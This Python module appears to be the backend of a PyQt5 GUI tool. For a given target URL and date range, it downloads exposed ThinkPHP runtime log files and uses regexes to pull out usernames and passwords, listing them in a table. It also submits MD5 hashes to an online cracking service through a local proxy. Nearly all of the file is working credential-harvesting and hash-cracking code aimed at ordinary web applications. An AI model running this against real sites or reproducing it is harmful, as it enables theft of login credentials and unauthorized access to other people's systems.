import datetime
import json,requests
import re, threading
from PyQt5.QtCore import Qt
from PyQt5.QtWidgets import QTableWidgetItem

session = requests.Session()
session.keep_alive = False
requests.adapters.DEFAULT_RETRIES = 5
requests.packages.urllib3.disable_warnings()

user_list = []
pass_list = []
other_list = []

def dateRange(beginDate, endDate):
    dates = []
    dt = datetime.datetime.strptime(beginDate, "%Y-%m-%d")
    date = beginDate[:]
    while date <= endDate:
        dates.append(date)
        dt = dt + datetime.timedelta(1)
        date = dt.strftime("%Y-%m-%d")
    return dates


def url_input(ui,date,rule):
    url = ui.lineEdit.text()
    if url.find('http') != -1 or url.find('https') != -1:
        while True:
            if url.count('/') > 2:
                url = url.rpartition('/')[0]
            else:
                break
        #print(url)
    else:
        url = 'http://' + url
        while True:
            if url.count('/') > 2:
                url = url.rpartition('/')[0]
            else:
                break
        #print(url)
    if re.findall('((https|http)://[\d\w-]+\.[\d\w]+)',url):
        msg = read_log(ui,url,date,rule)             #读取日志
        #t = threading.Thread(target=hello_for('aaaaaaaaaa'))
        #t.start()  # 启动线程，即让线程开始执行
        if msg is not None:
            ui.pushButton.setText('开始查找')
            ui.pushButton.setEnabled(True)
            return msg
    else:
        #print('请输入正确url')
        ui.pushButton.setText('开始查找')
        ui.pushButton.setEnabled(True)
        return '请输入正确url'
    #print(url)

def main_task(ui):
    ui.pushButton.setEnabled(False)
    ui.pushButton.setText('正在查找')
    for rowNum in range(0, ui.tableWidget.rowCount())[::-1]:
        ui.tableWidget.removeRow(rowNum)
    custom_url = ui.lineEdit_4.text()
    default_url = ui.lineEdit.text()
    connect = ui.lineEdit_5.text()
    if connect != '':
        rule = connect
    else:
        rule = ''
    date_start = ui.dateEdit.date().toString(Qt.ISODate)
    date_end = ui.dateEdit_2.date().toString(Qt.ISODate)
    dates = dateRange(date_start, date_end)
    #dates = ['2020-08-19','2021-01-13']
    for date in dates:
        #date = '21_01_13'
        if custom_url == '':
            if default_url == '':
                ui.pushButton.setText('开始查找')
                ui.pushButton.setEnabled(True)
                return ui,'请输入url'
            else:
                msg = url_input(ui,date,rule)        #处理url
                if msg is not None:
                    ui.pushButton.setText('开始查找')
                    ui.pushButton.setEnabled(True)
                    return ui,msg
                #print(url)
        else:
            url = custom_url
            msg = read_log(ui,url,date,rule)          #读取日志
            if msg is not None:
                ui.pushButton.setText('开始查找')
                ui.pushButton.setEnabled(True)
                return ui, msg
            #print(url)

        #print(url)
        ui.label_7.setText('查找完毕')
    ui.pushButton.setText('开始查找')
    ui.pushButton.setEnabled(True)

def read_log(ui,url,date,rule):
    global user_list
    global user_list
    global other_lit

    tp_type = ui.comboBox.currentIndex()
    #url = 'http://hefq.orangeaiedu.com'
    if tp_type == 0:
        date = date.replace('-','_')[2:]
        logurl = url+'/Application/Runtime/Logs/Admin/'+date+'.log'
    else:
        date = date.replace('-','/').replace('/','',1)
        logurl = url+'/runtime/log/'+date+'.log'
    ui.label_7.setText('正在查找：'+logurl)
    print(logurl)
    try:
        log = requests.get(url=logurl,verify=False)
    except:
        return '错误字符，请检查输入链接'

    user_passs = re.findall("((`*username`*=['|\"]*([\d\w]+)'(.*)`*password`*=['|\"]*([\d\w]+))|(`*user`*=['|\"]*([\d\w]+)['|\"]*(.*)`*passwd`*=['|\"]*([\d\w]+))|(`*user_name`*=['|\"]*([\d\w]+)['|\"]*(.*)`*pass_word`*=['|\"]*([\d\w]+)))'",log.text,re.I)
    #user_pass1 = re.findall("`username`='([\d\w]+)'(.*)`password`='([\d\w]+)'",log.text,re.I)
    for user_pass in set(user_passs):
        #print(user_pass1)
        #print(user_pass)
        if (user_pass[2] in user_list) and (user_pass[4] in pass_list):
            continue
        user_list.append(user_pass[2])
        pass_list.append(user_pass[4])
        #print(user_list)
        #print(pass_list)
        row_cnt = ui.tableWidget.rowCount()  # 读取行
        ui.tableWidget.insertRow(row_cnt)
        url = QTableWidgetItem(logurl)
        user = QTableWidgetItem(user_pass[2])
        passwd = QTableWidgetItem(user_pass[4])
        ui.tableWidget.setItem(row_cnt, 0, url)
        ui.tableWidget.setItem(row_cnt, 1, user)
        ui.tableWidget.setItem(row_cnt, 2, passwd)

    users = re.findall("((`*username`* = ['|\"](.*)['|\"])|(`*user`* = ['|\"](.*)['|\"])|(`*user_name`* = ['|\"](.*)['|\"]))",log.text,re.I)
    #print(users)
    for user in set(users):
        if user[2] == '':
            continue
        elif (user[2] in user_list):
            continue
        user_list.append(user[2])
        #print(user_list)
        row_cnt = ui.tableWidget.rowCount()  # 读取行
        ui.tableWidget.insertRow(row_cnt)
        url = QTableWidgetItem(logurl)
        user = QTableWidgetItem(user[2])
        passwd = QTableWidgetItem('')
        ui.tableWidget.setItem(row_cnt, 0, url)
        ui.tableWidget.setItem(row_cnt, 1, user)
        ui.tableWidget.setItem(row_cnt, 2, passwd)

    passwords = re.findall("((`*password`*=['|\"]([\d\w]+)['|\"])|(`*passwd`*=['|\"]([\d\w]+)['|\"])|(`*pass_word`*=['|\"]([\d\w]+)['|\"]))", log.text, re.I)
    #print(passwords)
    for password in set(passwords):
        if password[2] == '':
            continue
        elif (password[2] in pass_list):
            continue
        user_list.append(password[2])
        #print(pass_list)
        row_cnt = ui.tableWidget.rowCount()  # 读取行
        ui.tableWidget.insertRow(row_cnt)
        url = QTableWidgetItem(logurl)
        user = QTableWidgetItem('')
        passwd = QTableWidgetItem(password[2])
        ui.tableWidget.setItem(row_cnt, 0, url)
        ui.tableWidget.setItem(row_cnt, 1, user)
        ui.tableWidget.setItem(row_cnt, 2, passwd)
    others = re.findall(rule, log.text, re.I)
    for other in set(others):
        if other == '':
            continue
        elif (other in other_list):
            continue
        other_list.append(other)
        row_cnt = ui.tableWidget.rowCount()  # 读取行
        ui.tableWidget.insertRow(row_cnt)
        url = QTableWidgetItem(logurl)
        othe = QTableWidgetItem(other)
        ui.tableWidget.setItem(row_cnt, 0, url)
        ui.tableWidget.setItem(row_cnt, 3, othe)


def md5_decrypt(hash):
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }

    headers =  {'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://www.somd5.com',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://www.somd5.com/',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cookie': 'Hm_lvt_7cbb4bb91b6ffb8d7caebd60d7652ff4=1610889507; Hm_lpvt_7cbb4bb91b6ffb8d7caebd60d7652ff4=1610889507'
    }
    data = "hash="+hash+"&t=0&captcha=t03zH-c2suN2tiggNq8-eJtRqtcqxhkcYVZkJ2BGWZ528aSd4hzTIu7tUi_Z5RzO4L6Bb-pPlpsw7ySghXMc0IIpSiyH15ylOQHlv7xVhsoRbrWhAU9eNQngA**%7C%40O52"

    passwd = requests.post("https://www.somd5.com/search.php",headers=headers,data=data,verify=False,proxies=proxies)
    ruselt = json.loads(passwd.text)
    try:
        print('密码：'+str(ruselt['data']))
        return '密码：'+str(ruselt['data'])
    except:
        if ruselt['err'] == 2:
            return '接口错误，错误id：'+str(ruselt['err'])
        if ruselt['err'] == 3:
            return '未解出'
        else:
            return '未知错误，错误id：'+str(ruselt['err'])
if __name__ == '__main__':
    md5_decrypt('e10adc3949ba59abbe56e057f20f883e')